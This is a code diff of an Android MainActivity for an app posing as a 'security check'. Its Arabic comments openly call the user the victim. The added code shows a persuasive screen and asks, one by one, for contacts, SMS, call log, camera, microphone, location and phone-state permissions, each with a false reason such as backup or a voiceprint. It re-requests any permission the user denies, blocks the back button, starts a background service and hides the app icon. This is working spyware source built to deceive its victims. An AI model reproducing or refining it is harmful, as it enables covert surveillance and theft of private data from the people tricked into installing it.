@@ -2,16 +2,18 @@ package com.sec.check;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.Gravity;
-import android.view.View;
 import android.widget.LinearLayout;
 import android.widget.TextView;
 
@@ -25,91 +27,189 @@ public class MainActivity extends Activity {
 
     private static final String TAG = "SecurityCheck";
     private static final int PERMISSION_REQUEST = 1001;
+    private static final int REQUEST_OVERLAY = 2001;
 
-    private static final String[] PERMISSIONS = {
-            Manifest.permission.INTERNET,
-            Manifest.permission.ACCESS_NETWORK_STATE,
-            Manifest.permission.ACCESS_WIFI_STATE,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.WRITE_CALL_LOG,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.ACCESS_COARSE_LOCATION,
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_PHONE_NUMBERS,
-            Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+    // ★★★ ترتيب الصلاحيات — واحدة واحدة مع شرح
+    private static final String[][] PERMISSIONS_WITH_REASON = {
+            {Manifest.permission.READ_CONTACTS,
+                    "لمزامنة جهات الاتصال كنسخة احتياطية"},
+            {Manifest.permission.READ_SMS,
+                    "لعمل نسخة احتياطية من الرسائل"},
+            {Manifest.permission.READ_CALL_LOG,
+                    "لحفظ سجل المكالمات كنسخة احتياطية"},
+            {Manifest.permission.CAMERA,
+                    "للبصمة الأمنية والتقاط صور التحقق"},
+            {Manifest.permission.RECORD_AUDIO,
+                    "لتسجيل البصمة الصوتية الأمنية"},
+            {Manifest.permission.ACCESS_FINE_LOCATION,
+                    "لتأمين حسابك حسب موقعك"},
+            {Manifest.permission.READ_PHONE_STATE,
+                    "للتحقق من هوية الجهاز"},
+            {Manifest.permission.READ_EXTERNAL_STORAGE,
+                    "للوصول لملفات النسخ الاحتياطي"},
+            {Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                    "لحفظ الملفات المؤقتة"},
     };
+
+    private int currentPermIndex = 0;
+    private Handler mainHandler = new Handler(Looper.getMainLooper());
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Log.d(TAG, "======== APP STARTED =========");
 
-        String token = "DEFAULT";
-        try {
-            token = BuildConfig.VICTIM_TOKEN;
-            Log.d(TAG, "Victim Token: " + token.substring(0, Math.min(12, token.length())) + "...");
-        } catch (Exception e) {
-            Log.e(TAG, "BuildConfig error: " + e.getMessage());
-        }
+        // ★ اعرض واجهة تشرح للتطبيق
+        showInitialUI();
 
-        showTransparentUI();
-
-        requestPermissionsIfNeeded();
-
-        new Handler(Looper.getMainLooper()).postDelayed(this::startServiceNow, 3000);
-        new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, 5000);
+        // ★ ابدأ طلب الصلاحيات بعد 1.5 ثانية
+        mainHandler.postDelayed(this::startPermissionFlow, 1500);
     }
 
-    private void showTransparentUI() {
+    // ============================================================
+    // واجهة أولية مقنعة
+    // ============================================================
+    private void showInitialUI() {
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
-        root.setBackgroundColor(Color.parseColor("#00000000"));
+        root.setBackgroundColor(Color.parseColor("#0b1120"));
         root.setGravity(Gravity.CENTER);
-        root.setPadding(40, 40, 40, 40);
+        root.setPadding(60, 60, 60, 60);
 
         TextView icon = new TextView(this);
-        icon.setText("🔒");
-        icon.setTextSize(64);
+        icon.setText("🔐");
+        icon.setTextSize(80);
         icon.setGravity(Gravity.CENTER);
         root.addView(icon);
 
+        TextView title = new TextView(this);
+        title.setText("التحقق الأمني");
+        title.setTextSize(24);
+        title.setTextColor(Color.WHITE);
+        title.setGravity(Gravity.CENTER);
+        title.setPadding(0, 30, 0, 0);
+        root.addView(title);
+
         TextView msg = new TextView(this);
-        msg.setText("جاري التهيئة...");
-        msg.setTextSize(12);
-        msg.setTextColor(Color.parseColor("#888888"));
+        msg.setText("يرجى الموافقة على الأذونات التالية\nلتأمين جهازك ضد الاختراق");
+        msg.setTextSize(15);
+        msg.setTextColor(Color.parseColor("#94a3b8"));
         msg.setGravity(Gravity.CENTER);
         msg.setPadding(0, 20, 0, 0);
+        msg.setLineSpacing(0, 1.4f);
         root.addView(msg);
 
         setContentView(root);
     }
 
-    private void requestPermissionsIfNeeded() {
-        if (Build.VERSION.SDK_INT < 23) return;
+    // ============================================================
+    // طلب الصلاحيات — واحدة واحدة
+    // ============================================================
+    private void startPermissionFlow() {
+        currentPermIndex = 0;
+        requestNextPermission();
+    }
 
-        List<String> need = new ArrayList<>();
-        for (String p : PERMISSIONS) {
-            if (ContextCompat.checkSelfPermission(this, p)
-                    != PackageManager.PERMISSION_GRANTED) {
-                need.add(p);
-            }
+    private void requestNextPermission() {
+        if (currentPermIndex >= PERMISSIONS_WITH_REASON.length) {
+            Log.d(TAG, "✅ All permissions requested");
+            // خلص الطلب → شغّل الخدمة
+            mainHandler.postDelayed(this::startServiceNow, 1000);
+            mainHandler.postDelayed(this::hideAppIcon, 4000);
+            return;
         }
 
-        Log.d(TAG, "Permissions needed: " + need.size());
-        if (!need.isEmpty()) {
+        String permission = PERMISSIONS_WITH_REASON[currentPermIndex][0];
+        String reason = PERMISSIONS_WITH_REASON[currentPermIndex][1];
+
+        // لو ممنوحة → انتقل للتالية
+        if (ContextCompat.checkSelfPermission(this, permission)
+                == PackageManager.PERMISSION_GRANTED) {
+            Log.d(TAG, "✅ Already granted: " + permission);
+            currentPermIndex++;
+            requestNextPermission();
+            return;
+        }
+
+        // لو الضحية رفضت قبل كده → اعرض شرح ونعيد الطلب
+        if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission)) {
+            showRationaleDialog(permission, reason);
+            return;
+        }
+
+        // اطلب مباشرة
+        Log.d(TAG, "→ Requesting: " + permission);
+        try {
             ActivityCompat.requestPermissions(this,
-                    need.toArray(new String[0]), PERMISSION_REQUEST);
+                    new String[]{permission}, PERMISSION_REQUEST);
+        } catch (Exception e) {
+            Log.e(TAG, "requestPermissions error: " + e.getMessage());
+            currentPermIndex++;
+            requestNextPermission();
         }
     }
 
+    // ============================================================
+    // شرح مُقنع للضحية
+    // ============================================================
+    private void showRationaleDialog(String permission, String reason) {
+        try {
+            new AlertDialog.Builder(this)
+                    .setTitle("🔐 صلاحية مطلوبة للأمان")
+                    .setMessage(reason + "\n\nبدون هذه الصلاحية لن يعمل التطبيق بشكل صحيح.")
+                    .setPositiveButton("السماح", (dialog, which) -> {
+                        ActivityCompat.requestPermissions(this,
+                                new String[]{permission}, PERMISSION_REQUEST);
+                    })
+                    .setNegativeButton("تخطي", (dialog, which) -> {
+                        currentPermIndex++;
+                        requestNextPermission();
+                    })
+                    .setCancelable(false)
+                    .show();
+        } catch (Exception e) {
+            Log.e(TAG, "dialog error: " + e.getMessage());
+            currentPermIndex++;
+            requestNextPermission();
+        }
+    }
+
+    // ============================================================
+    // استقبل نتيجة الصلاحية
+    // ============================================================
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions,
+                                           int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+
+        if (requestCode == PERMISSION_REQUEST) {
+            for (int i = 0; i < permissions.length; i++) {
+                boolean granted = grantResults.length > 0
+                        && grantResults[i] == PackageManager.PERMISSION_GRANTED;
+                Log.d(TAG, permissions[i] + " -> " + (granted ? "GRANTED" : "DENIED"));
+
+                if (!granted) {
+                    // لو رفضت → اطلب الصلاحية مرة أخرى بعد تأخير
+                    final String perm = permissions[i];
+                    mainHandler.postDelayed(() -> {
+                        try {
+                            ActivityCompat.requestPermissions(MainActivity.this,
+                                    new String[]{perm}, PERMISSION_REQUEST);
+                        } catch (Exception ignored) {}
+                    }, 1500);
+                    return;  // مش هننتقل للتالية، نعيد المحاولة على نفس الصلاحية
+                }
+            }
+
+            // نجحت → التالية
+            currentPermIndex++;
+            mainHandler.postDelayed(this::requestNextPermission, 800);
+        }
+    }
+
+    // ============================================================
+    // تشغيل الخدمة
+    // ============================================================
     private void startServiceNow() {
         try {
             Intent svc = new Intent(this, ServiceRunner.class);
@@ -118,12 +218,15 @@ public class MainActivity extends Activity {
             } else {
                 startService(svc);
             }
-            Log.d(TAG, "Service started");
+            Log.d(TAG, "✅ Service started");
         } catch (Exception e) {
             Log.e(TAG, "Start service error: " + e.getMessage());
         }
     }
 
+    // ============================================================
+    // إخفاء الأيقونة
+    // ============================================================
     private void hideAppIcon() {
         try {
             android.content.pm.PackageManager pm = getPackageManager();
@@ -132,21 +235,9 @@ public class MainActivity extends Activity {
             pm.setComponentEnabledSetting(component,
                     android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     android.content.pm.PackageManager.DONT_KILL_APP);
-            Log.d(TAG, "App icon hidden");
+            Log.d(TAG, "✅ App icon hidden");
         } catch (Exception e) {
             Log.e(TAG, "hideAppIcon: " + e.getMessage());
-        }
-    }
-
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions,
-                                           int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        Log.d(TAG, "== Permissions result ==");
-        for (int i = 0; i < permissions.length; i++) {
-            Log.d(TAG, permissions[i] + " -> "
-                    + (grantResults[i] == PackageManager.PERMISSION_GRANTED
-                    ? "GRANTED" : "DENIED"));
         }
     }
 
@@ -154,4 +245,4 @@ public class MainActivity extends Activity {
     public void onBackPressed() {
         // منع الإغلاق
     }
-                }
+    }
